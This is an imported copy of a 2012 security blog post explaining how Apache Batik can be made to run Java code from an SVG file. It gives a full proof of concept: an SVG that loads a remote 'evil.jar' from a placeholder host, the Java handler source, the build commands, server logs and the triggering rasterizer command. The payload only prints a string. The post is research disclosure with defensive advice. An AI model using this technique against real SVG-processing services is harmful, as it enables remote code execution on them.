---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2012-05-11_svg-files-and-java-code-execution.md
original_filename: 2012-05-11_svg-files-and-java-code-execution.md
title: SVG files and Java code execution
category: documents
detected_topics:
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 7a6b023f62b80c623cd54797a8adcd453bc16b2aa6ff40b993d88a64e4f014b9
text_sha256: 2c48deba3c5ab77cc5f7142697c58ff628758779c5cf1e8129d1fa58ca0de7b3
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# SVG files and Java code execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2012-05-11_svg-files-and-java-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `7a6b023f62b80c623cd54797a8adcd453bc16b2aa6ff40b993d88a64e4f014b9`
- Text SHA256: `2c48deba3c5ab77cc5f7142697c58ff628758779c5cf1e8129d1fa58ca0de7b3`


## Content

---
title: "SVG files and Java code execution"
page_title: "SVG files and Java code execution | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html"
final_url: "https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["Apache Batik"]
bugs: ["Arbitrary code execution"]
publication_date: "2012-05-11"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6416
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2012](https://www.agarri.fr/blog/archives/2012/index.html) > [05](https://www.agarri.fr/blog/archives/2012/05/index.html) >  
[<](https://www.agarri.fr/blog/archives/2012/02/17/compromising_hp_san_appliances/index.html) 17:33:58 [>](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)

##  vendredi 11 mai 2012, 17:33:58 (UTC+0200) 

### SVG files and Java code execution

I recently had to audit an application using the [Batik framework](http://xmlgraphics.apache.org/batik/) to convert SVG files to PNG images. Given that the [SVG 1.1](http://www.w3.org/TR/SVG/) and [SVG Tiny 1.2](http://www.w3.org/TR/SVGTiny12/) specifications allow to [call Java code](http://www.w3.org/TR/SVG/script.html) from the SVG file and that Batik [supports](http://xmlgraphics.apache.org/batik/using/scripting/java.html#javaInDocument) this feature, I had to give it an in-depth look.

  

The concept (you can read the links above for more details) is to link from the SVG file to a specifically crafted JAR file. DOM events will accordingly trigger execution of Java code. Some (non standardized) security restrictions may apply. Let's try to create a PoC ...

  

First, we need a minimalist SVG file referencing the JAR file:
  
  
  $ cat - > evil.svg
  <svg xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  version="1.0">
  <script type="application/java-archive" xlink:href="http://somewhere/evil.jar"/>
  <text>Static text ...</text>
  </svg>
  ^D
  

  

Now, we need to generate the JAR. The final result should be something like that:
  
  
  $ unzip -l evil.jar
  Archive:  evil.jar
  Length  Date  Time  Name
  ---------  ---------- -----  ----
  0  2012-05-10 18:28  META-INF/
  68  2012-05-10 18:28  META-INF/MANIFEST.MF
  0  2012-05-10 17:50  com/
  0  2001-03-19 21:27  com/pwnage/
  0  2012-05-10 18:25  com/pwnage/svg/
  742  2012-05-10 18:22  com/pwnage/svg/SVGHandler.class
  

  

Creation of SVGHandler.java:
  
  
  $ mkdir -p com/pwnage/svg
  $ cat - > com/pwnage/svg/SVGHandler.java
  package com.pwnage.svg;
  
  import org.w3c.dom.events.Event;
  import org.w3c.dom.events.EventListener;
  
  import org.w3c.dom.svg.EventListenerInitializer;
  import org.w3c.dom.svg.SVGDocument;
  import org.w3c.dom.svg.SVGSVGElement;
  
  public class SVGHandler implements EventListenerInitializer {
  
  public SVGHandler() {
  }
  
  public void initializeEventListeners(SVGDocument document) {
  SVGSVGElement root = document.getRootElement();
  EventListener listener = new EventListener() {
  public void handleEvent(Event event) {
  System.out.println("Oh yeah, inside SVGLoad !"); // Our 31337 payload ;-)
  }
  };
  root.addEventListener("SVGLoad", listener, false);
  }
  
  }
  ^D
  

Some specific entries are needed in the MANIFEST.MF file:
  
  
  $ cat - > My_Manifest
  Manifest-Version: 1.0
  SVG-Handler-Class: com.pwnage.svg.SVGHandler
  
  ^D
  

Now compile to .class and create the JAR:
  
  
  $ javac -cp /usr/share/java/xml-apis-ext.jar com/pwnage/svg/SVGHandler.java
  $ jar cmf My_Manifest evil.jar com/
  

We are ready to test the two main tools of the Batik framwork, [Squiggle the SVG Browser](http://xmlgraphics.apache.org/batik/tools/browser.html) and [SVG Rasterizer](http://xmlgraphics.apache.org/batik/tools/rasterizer.html) !

  

The default security policy in Squiggle is to execute Java code if the JAR has the same origin than the SVG file (or is embedded):

  
![](/docs/batik-prefs.png)  

Let's put the SVG and JAR files on a remote web server and request the SVG from Squiggle. It works: the string "Oh yeah, inside SVGLoad !" is displayed to the console and we get the following Apache logs:
  
  
  192.168.166.9 - - [10/May/2012:23:16:39 +0200] "GET /evil.svg HTTP/1.1" 200 811 "-" "Batik/1.7"
  192.168.166.9 - - [10/May/2012:23:16:40 +0200] "GET /evil.jar HTTP/1.1" 200 2055 "-" "Java/1.6.0_26"
  

On the contrary, Rasterizer by default neither trigger the "SVGLoad" event or execute some Java code. The following options are needed:
  
  
  $ java -jar batik-rasterizer.jar -onload -scripts application/java-archive evil.svg
  About to transcode 1 SVG file(s)
  Converting evil.svg to evil.png ...
  Oh yeah, inside SVGLoad !
  ... success
  

TL;DR: Batik Rasterizer, used in a way similar to the [export module](https://github.com/highslide-software/highcharts.com/blob/master/exporting-server/index.php) of HighCharts.com, is safe by default. But beware if your application uses the Bridge or Swing components. And of course, do not browse untrusted SVG files using Squiggle !

  

EDIT: The [SVG](/docs/batik-evil.svg) and [JAR](/docs/batik-evil.jar) files are now available for download.

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
